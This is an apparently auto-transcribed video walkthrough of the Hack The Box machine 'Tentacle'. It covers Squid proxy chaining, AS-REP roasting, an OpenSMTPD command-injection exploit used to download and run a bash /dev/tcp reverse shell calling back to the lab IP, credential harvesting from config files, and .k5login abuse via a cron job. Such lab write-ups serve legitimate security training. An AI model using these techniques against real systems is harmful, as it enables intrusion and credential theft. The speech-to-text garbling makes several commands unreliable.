 what's going on youtube this is ipsec i'm doing technical from hack the box which was a really tough machine because of the number of topics this thing covers and none of them is web it starts off with a lot of network enumeration through a squid proxy however that squid proxy you can't just access the other networks until you point it at itself because there's an acl preventing like the 10 10 14 network from accessing the 1051 network however if you chain the proxies to go from 10 10 14 to 127.001 then you're no longer coming from that network you can access to scan other things you find another squid box you do a three layer proxy jump and from that one you can access a smtp server that's vulnerable to the latest open smtp exploit from 2020. you get root on that box to find out it's a podman container not docker and there's not much you can do but there are user credentials that you can use to access the box over kerberos yes this is a linux kdc so a linux domain controller and there's a bunch of kerberos things we do on the box and then at the end of the box we'll go and dig into the key tab file it's a lot to explain so let's just jump in as always we start with the nmap so dash sc for default scripts sv enumerate versions o a output all formats put in the nmap directory and call it tentacle and then the ip address of 101010224 and right off the bat we can see nmap tells us the box is offline however if we ping the box it is online and we've talked about this before and it's because i'm not running nmap with sudo and the reason why we need to do nmap with sudo in this case is because this box doesn't have port 80 or 443 listening the host discovery of nmap does a icmp request which is a ping and then checks those two ports 80 and 443 since 80 and 443 are offline and map doesn't work without sudo because nmap requires pseudo to do a ping command and you may be thinking why does ping work i just ping the box and i didn't need to do pseudo and if we look at ping it's not a setuid so it's not escalating up to the root permissions we can see right here the reason why ping works is it's using linux capabilities and we've talked about those a little bit in the past but we can see it has this capnet raw which lets it send raw packets out the network driver and because it has this permission it can do icmp request if we look at nmap it does not so if you wanted to run nmap from a unprivileged user you'd have to give it that permission set i'm just going to google set cap and map and then we go to the very first post and we can see it's telling you how to run nmap as a unprivileged user and it gives a few more capabilities this um capnet raw cabinet admin and capnet bind service raw sends like raw packets uh capnet admin allows you to do a lot of networky things if we just man capabilities we can see kind of what they do so cap admin uh capability list where's admin uh sysadmin catman admin here we go you can see all the things it allows you to do and then bind service lets you bind to a privileged port which is less than 10 24. so we just gave nmap all those capabilities so if i do git cap which and map we have those capabilities if you're curious why i'm doing this which command is because if i just do get cap and map it's not going to do anything which is just going to pull the full path out so it's just my lazy way of not trying to find exactly where every file is so now if i run nmap without sudo it's still going to fail and the reason why it fails here is because nmap's not smart enough to look at the capabilities it has and then enable them so in windows if you do like who am i slash priv and you see you have privileges but some of them are disabled it means you have those privilege because it's the privilege is listed it's just your shell doesn't have them enabled and you can easily enable them with like mimikats if you powershell it automatically enables them for you but we have the privilege it's just not enabled so we have to tell nmap uh to enable the privileges and we do it with this dash dash privilege flag so if i do nmap dash dash privileged the command now suddenly works now this is a lot to type every time you want to run nmap as a unprivileged user so that's kind of why i just always did sudo because i have root on this box so it doesn't matter the reason why you do this is if you wanted to give nmap access to low priv users without them escalating to root because nmap itself you can just execute shell commands so if you sudo nmap you are instantly root but if you didn't want to run this privilege every time you can create an alias so if we alias nmap is equal to nmap dash dash privileged appear i-v-i-l-e-g-e-d make sure i spell that correctly now when i run nmap without this it works now i can do a ps ef grip for nmap and you can see i didn't specify the privileged but it's there that is the magic of aliases the downside to aliases is it's for this one session so if i run the same command down here it doesn't work we could go into our dot bash rsc file and then just put alias nmap is equal to nmap dash dash privileged eged there we go and now every new session will have it working so if i copy this paste it here now we no longer need to run and map with root and i should not have actually ran that because now we have to wait for nmap to finish well we can look here so we have port 22 open it says it's open ssh 8.0 and because this is hacked the box and i'm not seeing an open ssh banner i'm not thinking this is a ubuntu base because normal ubuntu puts more information here we go to the next one we see port 53 dns ics isc bind and it's telling us it's red hat linux 8 or red hat enterprise linux 8. it's probably a center's box uh centers and red hat are essentially the same thing uh we have port 88 kerberos which is weird for a linux box and then 3128 which is a squared proxy so the very first thing we could do is try like a zone trans well we can't do a zone transfer because we don't know any like host name of this box uh to do a zone transfer you need to know like the domain name so we don't know that so there's not much we can do here i guess we could like ns lookup set the server to 10 10 10 2 2 4 and then try like a lookup of 127.001 it just gives us localhost uh we could try 101010224 we don't have anything so it that reverse lookup doesn't work so there's not much more i know to do with dns yet uh we can do kerberos but um well we can't we don't even have usernames or anything there are a few like impacted things we could try i forget them off that my head so yeah um i'm just going to skip that and we'll go to squid so let's connect to 10 10 10 2 2 4 port 3 one two eight and we have error the requested url could not be retrieved and we're looking at this and it says your cache administrator is this so we have a username i should be doing this in obsidian but if i used obsidian for this video to take notes i think it would go a very long time so i'm just going to create that as a user's file so we now have a dns name realcorp.htb and a user so what i can do is go in ns lookup again server101010224 realcorp.hdb and nothing is found for that i was expecting something to be there but no nothing is um we can go into our host file so v etsy host and say uh we have to do sudo uh 10 10 10 2 2 4 real corp dot hdb um let's see it's not much more we can go off we could try like in packets um since we have a user get np users so let's see the flag for this is what is it come on get np users target so let's try dash dc ip well we probably don't need that we probably can just do get np users cat users j dot n a k a z a w a real realcorp.htb [Music] uh let's see we need to specify dash no pass dash no pass and we can get a tgt for this user so this doesn't actually crack um if we try to crack this hashcat doesn't have a mode for this it has a mode in windows both windows and linux are using kerberos windows uses e type 23. we don't have e type 18 in hashcat if we google like e type 18 let's do asrep we get to this and here's a request for hash cat to add this attack mode because in windows it uses encryption type 23 which is ntlm also known as rc4-hmac for asrep but in linux it's a as128 for 17 and aes 256 for 18. so this is a hash encrypted in aes 256 so we can't crack it because hashcat only supports um the ntlm we can double check that so if we probably copy this do hash cat dash dash example hashes less search for aswrap we have e type 23 and that's it so there's not much we can do with that hash going back to the nmap scan let's see if there's anything else we can do we do have a both username and domain name now so we could try within squid to bruteforce a credential if squid has any type of authentication but it never prompted me for authentication so i'm going to assume squid doesn't have authentication we do have a domain now so we can try to do a brute force with that or a zone transfer i should say so if we do dig ax fr the domain name and then at the domain server so two to four if zone transfer was enabled it would print all the zones here so we don't have anything um we could use like go buster to brute force domain names so if i do go buster h we do have a dir mode so if we let's see look at these options it's probably going to be out of habit i said dir we have a dns mode so we need to specify the domain so that's going to be realcorp.hdb and then we probably need to specify the name server somehow so show ips um how do we specify okay use custom dns server so it's the resolver it calls it resolver so 101010224 and then the word list so we'll do opt set list and then discovery dns and we can say domains top 1 million let's say 5000 first so we can do dash o we'll say go buster dash dns.out and we are going to be seeing what name servers we have it found one ns.realcorp.hdb and i don't exactly like this piece because you're supposed to do this dns piece and i don't know like in my mind if i did this and looked up realcorp.htb it should resolve to something but it doesn't if i do ns.realcorp.hdb it resolves and i mean obviously you can configure a dns server to be like this but um i generally don't see dns service configured this way there is an address we have proxy.realcorp.htb so we can look at that and we do see it is on a different subdomain that's 10.197.243.77 so i'm going to [Music] let's create a directory notes move users into notes and inside the notes also put um ip and we'll put the ranges so ns and proxy this is in the are these the same address 77 i think it is so i'm still going to specify these as slash 24s so we have something on this network and the reason why i default to slash 24 is because that is the most common network so we have this let's see if we get any more um subdomains out of this to see if there's anything else on this box uh let's see ns i'm going to hit enter a few times and let's do proxy so yeah these are both going to the same thing there is a w pad so now we can do wpad.realcorp.htb and we can see that's a different address so ns and proxy is this so ns proxy is equal to that and we can say wpad is equal to this so we have some more information here um we can now use squid which is a http proxy to try to access wpad so if i do curl dash dash proxy is equal to http 1010102243128 and try to go to http 10 197 243 31 we get a access denied uh sir you are not currently allowed to request from this cache until you have authenticated yourself so we may have some have to do some form of authentication there are ways to generally bypass this so if we do 127.001 3128 uh wait let's go here 12701 3128 we can see we get invalid url so these two are very different and it may be better if i just show you in firefox so proxy settings if we go to manual 12701 3128 let's disable socks uh it's not actually 127 i'm so used to configuring for burp 10 10 10 2 2 4. i think that's right so if we go to 127 001 3128 unable to connect um i'm not sure firefox is smart enough to know to send let's see is there like a exclude no proxy for 10 10 10 2 2 4 3 1 2 8 that should be going through let's try the other one so we access this can we do we get access denied it doesn't look like my firefox is sending it through the proxy when i'm not sure why firefox is behaving this way probably something stupid um we're just going to use command line flags and proxy chains so what we have verified is we can use squid to hit itself so there's an acl that is preventing um us from going into this network this 10 243 network because we have verified that by this access denied so squid is saying the ip address 10 10 14 2 is not allowed to hit 10 197 243 31 but what if we proxied herself through squid so if i do v etsy proxychains.com i need sudo and do http 101010 224 3128 and then we're going to say one twenty seven zero zero one three one two eight and instead of doing curl dash dash proxy i'm just gonna use proxy chains so proxy chains curl it's going from us to local host and we can't get over to 10 197 243 31. so what if we went back we're not going to do proxy chains here this is where it's getting a little confusing i know let's try acting accessing wpad so 10 197 243 31. oh wait that is what we were accessing that's on port 3128 we get access denied so if we're trying to access the proxy 77 we get access denied here as well so i'm going to try to proxy chains and we'll do nmap dash st and we're going to nmap some of these boxes we're also going to do dash capital pn and we can say what is an ip less this let's go with both of these 31 v is going to show me open ports as it finds it and we'll do oa we'll call this nmap and we'll say through squid let's see we may want to add dash n dash n is not going to do dns lookup so we see it doing initializing parallel dns resolution i didn't want to do that so i did dash n the reason why i am specifying dash s capital t is i want to do a full tcp port scan i can't do the default which is like a send scan because it's going through a proxy and the proxy can't do it so generally how nmap does it quickly is it sends a um i think a tcp syn i'm going to go in the three-way handshake i'm probably gonna fail it's gonna send a tcp sent out and if it sees a syn ack come back it's gonna say the port is online it's not going to complete that three-way handshake because that's going to send unneeded packets because erie knows oh you sent us an act it's online um through a proxy it's not able to do that because it sends the sin out and then the proxy gets the syn ack and the proxy doesn't forward it back to our box so it doesn't know right so that's why that works um i'm just gonna let this end map finish i'm gonna pause the video and we'll see if any ports come back it takes a while so uh this is frustrating um nothing came back online and i think proxy map needs to be ran with sudo which doesn't really make sense to me but now that i did it we can see it's trying all these things and why i just said it doesn't really make sense because let's try proxy chains curl on let's see come on what is ip 10 197 243.77 let's try this products change curl this port 22 it goes through that chain we didn't see this when we didn't run proxy chains with sudo with nmap so there's some weird situation where nmap will probably always require you to do pseudo with proxy chains don't know exactly what it is i don't think it's proxy chains itself because um doesn't require it with sudo with curl but yeah something to keep in mind and if you want to hide this output which i would highly recommend whenever you do like proxy chains it's nice to see the chain but this is very like loud and annoying output so what i would generally recommend doing is picking a few ports let's say 2280 443 and 3128 because we know those are up and then running it to make sure it works and you get kind of like expected results we can see 3128 is closed on dots open on 77 and closed on 31 but what i would recommend doing is once you know you have your configuration correct go into the proxy chains configuration and turn quiet mode on it's going to say no output from library which now when i run this nmap it runs it still goes slow because we're going through a proxy but we don't have all those lines so now i'm just going to add the dash v flag so it does the top 1000 ports of all these it's probably going to take five to 15 minutes i would think so i'm going to pause the video and let it run nmap is now finished and we have some ports open it's kind of like the same as before though we have ssh dns kerberos some more kerberos ports and another squid but this ip address remember was um the proxy so it was the name server slash proxy so that kind of makes sense uh the thing i would be doing because i mean if we look at a regular nmap let's do nmap tentacle end map is i'd be looking at like the version history like the version strings or banners so maybe we want to do a version banner for 22 53 and three one two eight if we do a version banner on these three and we see any mismatched we know those just aren't the same because the question i have right now is this ip address the same ip address as 10 10 10 2 2 4 because i have no way to really know that so i'm going to do another proxy chains we'll do 77 and dash v o a we'll say through squid dash verbose and we'll say dash sc for default scripts sv enumerate versions so let's specify also 22 53 and 3128 because this would take forever if we just wanted to um run this so this will probably take five minutes i would guess to run so i'm going to let this run but it will give us all that sweet um version info and we can see if there's anything different between these two end maps i honestly don't know so yeah it'll be a treat once this finishes and it finished pretty much immediately after i hit pause recording so that did not take too long at all we do see it does have version flags so the ssh host key may actually be the best thing to look at to identify if these are the same so over on this panel let's do less add map and we'll say tentacle.nmap and we'll do here less and map tentacle uh not technical through squid verbose.map and let's see it looks like these host keys are the same so this ssh at least on 243.77 is going to the same exact ssh server as the hearst um it's possible they have the same ssh host key but that would be um really bad security because anyone who gets on the virtual machine or docker whatever this ip address is would be able to uh mirror in the middle of the other ssh if you have the same host key so that's weird looking at the bind server they are the same so we see 9 11 20 9 11 20 there and the squid uh proxy 4.11 squid 4.11 so for all intents and purposes it looks like it is completely the same between these two boxes i am still going to try to do a triple proxy so let's do v etsy proxychains.com we gotta do that with a pseudo and we can say http do this three one two eight and we'll see if we get anything else um before we do that we can comment this out real quick because there was two boxes and we couldn't hit one box so if we go to notes um ip we never could hit this 10 197 243 31 so i'm just gonna demonstrate that so proxy chains curl 10 197 243.31 can't connect um let's try adding this proxy chains to go through the triple proxy to see if anything happens here and we do so going through this third proxy allows us access into this box this is the w-pad box um if we look back here this is wpad.realcorp.htb so uh let's see i wonder if we need to specify the um virtual host so let's do sudo vi we can say wpat well uh 10 197 243.31 is wpad.realcorp.hdb and now when we proxy change this wpad.realcorp.htb uh we get a forbidden so if we do slash wpad wpad dot dot we get a file and if you don't know like that was not just a while well it was a wild guess but it doesn't come as out of left field as you think um if you've ever looked at like a um tcp dump on windows and you see them requesting a lot of wpad.dats looking for this file this is um i want to say it's windows proxy auto detect uh wpad let's see web proxy auto detect not windows i'm just used to seeing it but that is a common file so again wpad.dat and it's giving us um some instructions so if the dns name is realcorp.htb use the proxy if or direct i don't know direct is used proxy or not but let's see wpad uh direct direct access let's see how to use this let's see what is direct web browser and so i'm guessing you have like direct forward and things so this is telling it probably not to use the proxy i would guess not exactly sure but it's giving it some direction and we have two subnets and we knew this one but this subnet is new 10 241 251.0 so let's now do a recon on this and we're gonna do it two different ways the way i normally do dns like reverse lookups is through dns recon i don't know why i went through this habit um this is just the tool i like doing you can specify dash or arrange and then we got name server and domain so if i do dns recon dash r and i'm going to do 10 197 240 3.0 24 because i know these and this tool doesn't take too long to run um dash n i'm going to do 10 10 10 2 2 4 and that should be all i need for this tool to do reverse lookup brute forcing but it also wants the domain but domain doesn't matter so it's going to run and i think it's going to run maybe the domain does matter i'm used to seeing some type of input let's do a tcp dump okay there we go dash i ton zero and we're doing a lot of pings what do i have running i don't know what i have running oh that's never good um let's see udp port 53. let's try this again so all this is doing is doing reverse lookups so it's going to ns lookup so we can show this and that's lookup 1010 uh server 10 10 10 2 2 4 and if i just give it an ip 10 197.243.31 it's gonna do a reverse lookup we can see here and give us the hostname so all that is doing is brute forcing all of these so let's change this octet to be 251 and we'll see let's see what if i do we'll do two v's will this show us what we want 10 197 for some reason dns recon is taking a little bit to initialize and after dns recon we're going to use nmap to do this so we can see it here i'm going to pause this output let's see udp there we go so 10 197 251 253 so this request is the reverse lookup it's for some reason reverse like whenever you do reverse lookups you always do the ip address in reverse so last octet third octet second octet um first and then this dash dot in addr dot arp a that is like the reverse lookup thing and i think the reason why now looking at this you do that is for organizational purposes because um this is going to have the most hearse so in like a folder structure if you want to look at 10.nr address.arpa it would pull everything in the subnet if the ip was ordered the other way around where the first octet is here then it doesn't really make sense because you can't really organize it hopefully that makes sense so um let's see in terms of ips whoa so we have like 10 10 10 one and we can do these so two three four five six so if you want to put these ips in a folder you want to put this 10 in the folder right and how domains work is not like the right is i don't know if it's mostly significant but the further right you go on it is going to be the more domains it contains because like if i do um [Music] hackthebox.eu hackthebox.eu contains all the subdomains so you can go like web you have like male dot hack the box things like that so this 10 is the most important piece of the ip so we put that on this end so that way if i want to do like a zone transfer of um 10 11 12 or yeah 10 11 12 i can then just go give me this and then it's going to give me all the ips here so hopefully that makes sense and that's why it's organized that way i did not plan on explaining that it's just something i kind of noticed as i was going through this box so okay where are we um we went on a tangent and oh i need 10 241. two octets change here and we can go and update our notes so v notes ip and again probably should use obsidian for this but we have so much to talk about on this box um if i went in and started writing a blog post it would just go forever so srv pod01 is equal to and let's see it is this ip so we have a new thing and it's called pod and let's actually run nmap real quick first and map let's see this is that let's go to this ip so 10 241 251.113 and we'll call this sov pod01 so it's called a pod and in red hat it uses gently uses uh pod man instead of docker podman is very much like docker it's just red hat's variant of it um i used it once upon a time and the reason why i used podman was i could easily more do like full system d within it uh there's some like low level differences between podman and docker but um i'm sure docker works on red hat but this is the more common thing to use on red hat so i think i ran this nmap correctly proxy chains nmap stpn so tcp scan assume the port is online don't do dns uh reverse output all formats nmap oh we're doing script scan let's take that script scan off dash v there we go that'll go a bit quicker so it'll still probably take um sevenish minutes probably i said 10 to 15 when i did two boxes uh this one probably gonna do about seven minutes since it's only one so i'm going to pause the video and we'll come back when the scan finishes and hopefully hopefully hopefully i ran this map correctly so um it's been i don't know how long but uh it says it's going to take like four hours to complete so we are not waiting that long um i did dash v twice i don't know if that was it i doubt it was uh i'm gonna try the dash dash top ports and i think we can do 10 like the top 10 ports and let's see if this comes back with anything i'm also going to verify this is the right ip because i think it's not uh 10 241 251. is the ip so there we go that could have been the reason why it was taking forever uh we have extra things so the top ports it says 22 is off we have smtp uh i think that was actually why it took forever um was because i didn't have the riep i was timing out so um and going over in my head of why that may be the case is because we're doing the tcp scan um let's say the tcp timeout is 45 seconds it's going to send a sin to the ip address 10 241 241.113 and it's going to wait 45 seconds for a sin act to come back and since it's taken that long it's just holding up nmap in this case when the box we actually specify a correct ip it's not waiting that 45 seconds because we send the sin and then it sends us probably a fin back or reset or something back telling us the port is offline so that's why it goes much faster as long as you specify a valid ip address um yeah and i know a while ago i said we'd do nmap to do dns but i forgot to do that and we probably won't maybe at the end of the box uh if i think about it we'll do extra stuff but we have smtp listening on this so i'm going to specify dash port 25 and we can do sc sv and specify this dash verbose to see exactly what is listening um this is smtp and we can get let's see open [Music] zero smtpd200 and if we look at search point search point smtpd let's see i wish we had dates see it says bugs at openbsd.org so we probably know this is a [Music] bsd and let's see only two of these have bsd in the name one is c one is pl but let's see mail from i don't want to run perl and i don't want to run c so there's only one python script here python's the easiest to work with so i'm going to do a search dash x on this and see this um we see it's open smtpd662 the date is 2020.0129 and let's see i wonder how we figure out the open smtp version because this is saying two zero zero um it's probably going to be like six eight something uh let's see smtp enumerate version four ways to enumerate smtp so we tonet we can verify let's just tell it to the box so proxy chains nc [Music] 10 241 to 51 was it 73 25 maybe not go where my nmap is 113. okay we get here and we say huh s p user so i said hello to it and it says it's please to meet me and it doesn't give version so i'm not sure exactly how to enumerate what version it is so we're just going to throw the exploit script and if we look at this exploit script in depth um we need to modify the username and i guess what we could do we say hello and this test i'm putting here doesn't matter it can be anything um and it's using vrf why vrfy let's go and cat the user cat nodes users let's see if this is a valid email via fy like this uh invalid command i'm not sure why that is i wonder if we have to authenticate or something but i think i've done it in another box if you look at ipsec dot rocks and probably type smtp we've done user enumeration through it before maybe that applies here maybe it doesn't but i want to look at this exploit script so address is port 1 so this is going to be the ip address port and then command open smtp detected connected mail from so it just says hello it's not doing the heat the e one yeah it doesn't recognize the verify command so let's see payload sent root receive i'm just trying to figure out how this exploit works so we send it we need to put a email here so for this exploit to work it needs to be a valid user we send receipt to data where is the actual command oh it puts mail from and then we got command injection right here wow that is a basic exploit for this so let's try this so we can do python three four seven eight nine and then it's ten two forty one two fifty one one one three port twenty five and we want to do a command i'm going to try curl 10 10 14 2 port 8 000 actually wget is installed more often than curl so oh we can do 9001 whoops 9001. okay run this uh we have to proxy change this sent payload and we don't have anything what if i need to specify http nothing let's try 10 10 14 2. maybe there's a firewall that's not laying it out on port 9001 and maybe curl just i mean wg just doesn't exist we can try curl as well and we don't have anything the reason why i'm not doing ping is because i had a lot of pings going on in my box before um tcp dump dash i ton zero so if i do sudo this icmp um i think when i was playing with this box prepping the video i left an infinite ping going on and it's just hammering me or i have something running in the background so i'd have to reboot my box and revert there's this box for it to work um let's see let's go back into the exploit script receipt two i want to say we put it in these carrots but maybe we i think we have to see let's try something absolutely silly and replace the quotes whenever i have like issues and something i think should be working isn't i always replace the type of quotes i'm using and seeing if that fixes it and we can get rid of this http there we go so i think it was the quotes honestly um i'm going to try that again and we'll put double quotes here nope it wasn't i must have typo wait uh it keeps running w get against me oh um so i guess this exploit um may run multiple times once you get a success is it gonna stop okay so if i do http colon slash are we dealing with bad characters let's see and that's probably why my box is getting hammered by pings um when i was testing it i did not do a c1 so i mean i just ran ping 10 10 14 2 and it probably runs the command multiple times so i probably have like five or six different pings coming at me from this box so that's why uh we verified it runs the command multiple times with that w get command but what i just noticed is we have a lot of bad characters either the slash or the colon is a bad character because wget http doesn't go here but if i do this it does so what we want to do is make a simple reverse shell i'm not going to do a complex one and like that or i don't know why i just make do that um make their w dub v shell.sh i'm going to create a bash shell that's going to be somewhat complex so bash dash i like this dev tcp 1010 14 2 and i'm actually not sure if this is going to work because this is bsd to my knowledge i actually don't need this shebang because i'm going to execute it with bash but i don't want to put all these characters up here because we validated this exploit doesn't like special characters so i'm going to try to keep the top as simple as possible and then the bottom won't be um if we do python 3-m hdb server 80 we get permission denied but remember we talked about capabilities earlier so um was it i think capnet raw so um if i do set cap capnet raw is equal to or plus we'll give it everything eip and which python3 uh we gotta pseudo that let's see it doesn't want a symlink file so which python3 is appointed to python39 there we go so we give python the capability uh it's actually probably bind service is what i want um permission denied still let's see man capabilities uh capability there we go capnet so we got admin spy capnet bind service uh privilege 124. so let's go back here i'm going to remove capnet raw i'm going to do capnet find service on python3 permission denied oh ah i had a minus there give it plus and now i can run python 3 on port 80 without being root it's a little thanks so let's now w get we want to do shell.sh dash capital o for out file dev shm shell.sh and we should download it it'll probably download multiple times why are you not connecting something may be wrong with my vpn let's see that's up ping 10 10 14 1 my vpn's online but the box may not be it's not connecting to port 25. let's see sudo v etsy proxychains.com let's turn quiet mode off c dash o dev shm shell sh we can download again let's sudo with this proxy chains and it works um what i wonder if proxy chains is not compatible with capabilities and by giving python the capability that's what then hung proxy chains and that's what we did with nmap i bet that's where the issue i was having that's probably it honestly that is some weird behavior but yeah i'm guessing it's the capabilities that screws this um i'm gonna try running this again real quick sorry for this uh sometimes i'm doing these videos well almost every time when doing these videos i learn things so proxy chains not working there right so let's test this theory let's do set cap let's remove all the privileges it works so yeah it's the capability so let's see that's effective that's inherited if i do remove inherited then i don't think proxy chains will get it nope let's see let's remove e okay so um e i think effective in capabilities applies to childs let's see who's effective permitted inheritable effective so the set of capabilities used by the kernel to perform permission checks for the thread so for some reason if you have the effective capability and proxy chains it's not going to work i wonder if my python will still work without root no it doesn't so we need that so we definitely need that e permission if i just do a git cap i will have permitted but i won't have anything else oh i don't i must have removed permitted let's see plus p okay proxy chains okay any capability breaks proxy chains that is annoying so let's add everything there we go and we can pseudo this so we have it getting shell.sh so now if i execute shell.sh bashdev shm shell.sh we should get a shell uh www i did it on port 9001 and boom we are now on this box i'm going to verify it is openbsd and it's not it is a linux box so not bsd if i cat etsy was it red hat dash release uh let's see it's see cat lsb let's do lsla lsb star nothing lsla stir rel cat os dash release and it is a debian box so if we do lsla on slash we don't have anything we do ipaddr we have e0 so i think i'm in podman right now which is like red hat's docker i don't see that dot docker m i don't see a podman n i don't see like a weird interface i guess e0 at f4 is a little weird but i don't see anything right off the bat that's telling me i am inside of a container out of curiosity i'm going to uh copy lin and noom so opt privilege escalation awesome script suite let's pull the latest version and let's cp uh let's see what is it len p's then ps.sh so cp linps.sh2 hdb tentacle dub dub dub we can go end dev shm wget 1010 14 2 lynn ps.sh and we can execute well before i execute i want to do python 3 c import pty pty dot spawn then bash uh let's see do i have python at all which python let's see let's see what is python installed which python is it user bin yeah ls user bin grab python okay i'm going to do script dash queue uh let's do script h real quick script quiet output dev null let's see os dev null does that exist yeah let's see script dash q dash o dev null test good dash q it's been a while since i've used script to get a tty let's just do dev shm script filter parse output size oh that's output limit uh script dash q devnl okay so this is the same as python pty command i'm just so used to seeing dash o as output but that's output limit now i can do stdy raw minus echo fg enter enter and do not have tab auto complete sh do not so i'm screwing up the tab autocomplete but oh well um bash linps.sh we can run this i am already root sort of take a bit longer bashlin let's see os linux path date system environment is this a virtual machine yes but it's not saying i'm in a container let's see this is the container it detects i am in a podman container so lynn p's does detect this and what capabilities we have on it you can see all the ping commands that's why my box was getting so many pings see and we're going to get a lot of false positives with this because we are root and lin pease isn't designed it does do like docker checks or pod van checks i guess in this case but it doesn't really specialize in breakouts so we have something in etsy smtp creds so if i cut this file smtp slash creds we have a hash for this user also if we go to slash home we do have that user so we can go in his directory and if we look there is this file that i don't know exactly what it is cat msmtprc and it does contain what looks like to be his password so i'm going to google what this file is so we know if i go to google uh let's see it's a smtp client so it allows pretty much sendmail to authenticate to smtp so we have cleartext passwords for this guy so let's go b notes users and we can finally say his password is that so if i try to ssh as him so ssh j dot n a k a z a w a at 10 10 10 2 2 4. yes we don't get in so let's see let's do proxy chains ssh and this is kind of silly because um what was i going to say well root on this box i'm just kind of curious so let's do ten two four one two five one two four one two five one dot one one three oh ssh was not listening on this box so we can't get in however if you remember way back at the beginning the video we did validate that this user is within kerberos by using that get np users so um get np i don't have that there i'm not sure in the command off the top of my head if you really want to go see it um you can just go to the beginning of the video we'll just move on and start configuring our parent box to use um realcorp.hdb as a kerberos server so in order to do that i want to run knit but i don't have um this file or binary so we have to install it so app install kb5 dash user is going to install all the like user tools for adding kerberos i don't know what that says i'm just going to hit enter and then we're going to copy a config so cd etsy i'm going to v kb5.com let's cp kb5.com to kb5.conf dot back uh sudo sudo vi kb5 and let's see the default realm this is going to be the domain name so we want to do whoops um realcorp.hdb i don't think it has to be capital but it was capital so i do capital uh okay that's just tab i wish this was highlighted i'm not sure exactly why it's not then we have realms so this again is going to be realcorp.htb and then we gotta specify the kdc i'm gonna specify the kdc with port 88 and we have to know what the hostname of this box is so we're going to take a big leap of faith here if we go to 10 10 10 2 what was the ip 224 i think 3128 we do have a host name down here one thing i really wish is if we do nslookup server101010224 this hostname was in the dns but it's not that's why i call this the leap of faith we're just going to say maybe that is the first name so suv01 and i don't think it's case sensitive but i'm going to do it in lowercase because i think that's how it was here before we don't need anything else so i'm going to get rid of these two things this zone we don't want that again we don't have any of these sub domains so it may be better if i just created my own because holy cow they have a lot of stuff in this config so we got realms and then we got domain realm so we want period realcorp realcorp.htb is equal to realcorp.hdb and then this one real quick.htb there we go got more realms here i was going to delete the rest of this file there we go so now i think we have kerberos configured we have to make sure sov01 resolves to us so sudo vi and then we want to add sovo1.realcorp.hdb here and we can run hopefully well before we do this kerberos is a um time protocol so our time has to be in sync with the server uh so i can run probably ntp date do i have date i only have ntpd um let's see ubuntu install ntp date it's probably like ntp dash client app get update install ntp i don't know what provides ntp date app search ntp date probably just apt install ntp date sudo okay so ndp date dash q 10 10 10 2 2 4 and we can see our time is off by 275 seconds additionally if we went to the nmap uh let's see what is it hdb tentacle nmap technical.nmap i think we had ntp here right uh we don't oh ntp's udp so that's why we didn't see it but most kerberos servers because time is so important will have ntp um so this is almost five minutes it's like four minutes and 45 seconds off so we could sync our time so if i do date and then ntp date 10 10 10 2 2 4 date we can see i don't have permission to set the time so pseudo so i did date and now we're doing pseudo ntp date which i think should sync my clock to this guy and we can see i just jumped ahead four minutes or almost five minutes so now if i run this query we see my time is pretty much in sync with the server so now i want to um go into the k inet to generate the ticket and i just did that exit and open a new one so i'm back in hdb technical so i can do notes users and we can do k net uh realcorp.htb so sudo vi sc host venus add realcorp.hdb what 101010224 cannot find kdc for realm sudo vi etsy hosts that's there right ping 101010224 let's see this it is htb what did i do wrong pseudo v at ckb5.com default realm i'm going to try putting this in lowercase realcorp.htb uh we may not want to put these flags either okay net okay so let's delete this we only want those flags cannot find kdc for realm oh crap i left edu here so so what this is doing is it's choosing the default realm and it's going here to pick this as the default realm and i had edu here so the default realm was not here so it never found it that's what happened there that's annoying can it okay um ipsec is not found within kerberos database that's perfectly fine so if i cat notes users we can say knit and then the user i don't think we need the domain yep we don't so user and this password uh password incorrect was there like an exclamation point uh a underscore that i'm missing i think sometimes when i copy i miss special characters there we go so we don't have an error message and now if i just ssh.nakazawa at 10 10 10 2 2 4. it lets us in we just magically did kerberos authentication if i do sh dash v we can see what it's going to do let's see authentication it's doing gss api dash one of these i don't know with mic or a key probably um with mic has succeeded now there's one really weird catch with this it's only going to do the very first name in your host file so if i do sudo vi etsy hosts and we'll just put realcorp.htb at the start of this so let's swap these and say realcorp.hdb is here and i do this ssh wait oh yeah it did not succeed and the reason why is server host not found in kerberos database so it's only choosing the very first one for some reason um i'm not sure why that is in linux but yep that's the issue so it's case sensitive or not case but position sensitive when doing this so authentication succeeded and we are in um if you like wanted to specify you can always do the dash o option and ssh and tell it exactly all the flags but if you're doing linux always make sure the domain controller or kdc is the very first one for the ip address when you resolve it because it doesn't try them all so now we are on this box and we can get user.txt there is a ssh directory with known host but not much is here um we could do linps again to see if we're in a docker or i can do like a ip addr and because i see like these interfaces i'm going to assume i'm not in a docker i can also see 10 10 10 2 2 4 so back here when i did not see 10 10 10 2 i should have known i was in some type of virtual environment but seeing all these interfaces yes we're good um we can look at like cat etsy cron tab and we do see there is a cron for the admin username to execute this file every minute so if i look at this file to see what it's doing we are are syncing this folder verilog squid to home admin and that's doing some other things but if i go to vera log and we do lsla and grep for squid we can see admin and squid can write here if i do groups i'm a member of squid so i can write inside of this squid directory i can't read because i don't have the read permission set but i could write so i'm going to um very first thing i did was try to write an ssh key so sh key gen let's do f i'm going to call it admin and i can cat admin.pub and we're going to copy this and i'm going makederd.ssh cd.sh v authorized keys go here pwd i'm in var log squared dot ssh and authorize keys chmod 600 run date and we're just waiting for the time so it is 39 so now i can do a sleep 20 and in 20 seconds it's going to probably copy this file so what we can do here chmod 600 admin sh-i admin admin at 10 10 10 2 2 4 and we'll see if we get into the box when this finishes and there we go and no it does not so this er sync command does not look like it's doing what we would hope however there is another way we can abuse this because kerberos is on the box so the k5 login files is a very real thing so if i do vi k 5 login and we just put j dot naka zawa realcorp.hdb i think that's it i probably should have done um like a copy and paste with this name because it's not a common thing i type but paste this looks like i have this right and this file is just like a authorized key file so by having our username and the k5 login directory of home admin um we're saying essentially that this user has rights to log into the that user so i'm going to wait for that um minute to happen and we're going to try sshing as this user so sleep 20 and pause the video and the sleep has now finished so i'm going to exit this ssh session and we're going to get rid of the verbose we can say admin and we get in without a password again we're doing this um kerberos authentication and it's also good to mention that this is per like environment so if i run this ssh command down here it's going to ask me for a pass oh no it's not um i bet if i go back to one of these previous panes and try this is it for my whole user i guess it's for my whole user i thought it was for the session if i exit and run k list okay yep so it's cash for my whole um box right now k list command is going to show all the tickets you have so we have a ticket that lets us log into this box we are admin and lots of squid logs if i go in ssh we don't see the authorized key file so for some reason rsync did not copy the files in this directory so that's why that didn't work but if i cat k5 login we do see my user there which is granting [Music] jay nakazawa access here and 